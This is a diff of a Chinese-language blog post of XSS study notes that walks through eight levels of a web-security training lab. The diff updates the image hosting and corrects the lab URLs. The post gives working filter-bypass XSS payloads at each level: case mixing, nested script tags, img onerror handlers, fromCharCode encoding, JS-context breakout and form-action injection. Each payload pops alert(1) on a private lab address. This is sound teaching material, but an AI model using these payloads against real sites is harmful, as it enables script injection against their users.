@@ -20,31 +20,31 @@ date: 2016-03-23 21:47:05
     <script>alert(1)</script> 
 
     http://10.211.55.7/xss/example1.php?name=<script>alert(1)</script>
-![](https://ws3.sinaimg.cn/large/006tNc79gy1fvo6z3pfgxj31940o2dpd.jpg)
+![](https://blog-1256977701.cos.ap-chengdu.myqcloud.com/XSS学习笔记/1_第一关.jpg)
 
 ## 2. 第二关
 过滤掉了**小写**的**script**, 可以使用大小写混合的方法绕过。
 
     <sCrIpt>alert(1)</sCriPt>
 
-    http://10.211.55.7/xss/example1.php?name=<sCrIpt>alert(1)</sCriPt>
-![](https://ws1.sinaimg.cn/large/006tNc79gy1fvo6z6hos4j31ak0lwqby.jpg)
+    http://10.211.55.7/xss/example2.php?name=<sCrIpt>alert(1)</sCriPt>
+![](https://blog-1256977701.cos.ap-chengdu.myqcloud.com/XSS学习笔记/1_第二关.jpg)
 
 ## 3. 第三关
 过滤了**不区分大小写**的`<script>`与`</script>`，可以使用**嵌套**的script标签绕过。
 
     <sc<script>ript>alert(1)</sc</script>ript>
 
-    http://10.211.55.7/xss/example1.php?name=<sc<script>ript>alert(1)</sc</script>ript>
-![](https://ws3.sinaimg.cn/large/006tNc79gy1fvo6z7f3ldj317s0l07cf.jpg)
+    http://10.211.55.7/xss/example3.php?name=<sc<script>ript>alert(1)</sc</script>ript>
+![](https://blog-1256977701.cos.ap-chengdu.myqcloud.com/XSS学习笔记/1_第三关.jpg)
 
 ## 4. 第四关
 判断包含`script`字符串即报错, 可以使用其他标签如`img`绕过。
 
     <img src=x onerror="alert(1)">
 
-    http://10.211.55.7/xss/example1.php?name=<img src=x onerror="alert(1)">
-![](https://ws3.sinaimg.cn/large/006tNc79gy1fvo6z8tzxzj31680kaqaq.jpg)
+    http://10.211.55.7/xss/example4.php?name=<img src=x onerror="alert(1)">
+![](https://blog-1256977701.cos.ap-chengdu.myqcloud.com/XSS学习笔记/1_第四关.jpg)
 
 ## 5. 第五关
 判断包含alert字符串即报错, 可以使用编码方式绕过。
@@ -53,8 +53,8 @@ date: 2016-03-23 21:47:05
     或
     <img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
 
-    http://10.211.55.7/xss/example1.php?name=<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
-![](https://ws3.sinaimg.cn/large/006tNc79gy1fvo6zc3utaj318i0lmait.jpg)
+    http://10.211.55.7/xss/example5.php?name=<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+![](https://blog-1256977701.cos.ap-chengdu.myqcloud.com/XSS学习笔记/1_第五关.jpg)
 
 ## 6. 第六关
 直接在js环境中输出php变量, 可以通过构造js脚本绕过。
@@ -65,8 +65,8 @@ date: 2016-03-23 21:47:05
     或
     </script><script>alert(1)// (通过直接闭合前前后`script`来达到目的, 该方法在第七关不可用, 因为`<`和`>`被实体编码了/(ㄒoㄒ)/~~)
 
-    http://10.211.55.7/xss/example1.php?name=";b=alert(1);eval(b);//
-![](https://ws1.sinaimg.cn/large/006tNc79gy1fvo6zd0e96j316c0kyn53.jpg)
+    http://10.211.55.7/xss/example6.php?name=";b=alert(1);eval(b);//
+![](https://blog-1256977701.cos.ap-chengdu.myqcloud.com/XSS学习笔记/1_第六关.jpg)
 
 ## 7. 第七关
 在js环境中输出通过html编码的php变量, `htmlentities`没有过滤单引号, 使用单引号绕过。
@@ -75,16 +75,16 @@ date: 2016-03-23 21:47:05
     或
     ';alert(1);//
 
-    http://10.211.55.7/xss/example1.php?name=';b=alert(1);eval(b);//
-![](https://ws1.sinaimg.cn/large/006tNc79gy1fvo6zdyohaj316s0kk7c5.jpg)
+    http://10.211.55.7/xss/example7.php?name=';b=alert(1);eval(b);//
+![](https://blog-1256977701.cos.ap-chengdu.myqcloud.com/XSS学习笔记/1_第七关.jpg)
 
 ## 8. 第八关
 第八个xss的post地址使用了当前url, 达到构造当前url地址达到xss目的
 
     /"method="post"><script>alert(1)</script>
 
-    http://10.211.55.7/xss/example1.php/"method="post"><script>alert(1)</script>
-![](https://ws3.sinaimg.cn/large/006tNc79gy1fvo6zevnqej316u0kqtgm.jpg)
+    http://10.211.55.7/xss/example8.php/"method="post"><script>alert(1)</script>
+![](https://blog-1256977701.cos.ap-chengdu.myqcloud.com/XSS学习笔记/1_第八关.jpg)
 
 另外, 介绍另外几个**payload**
 
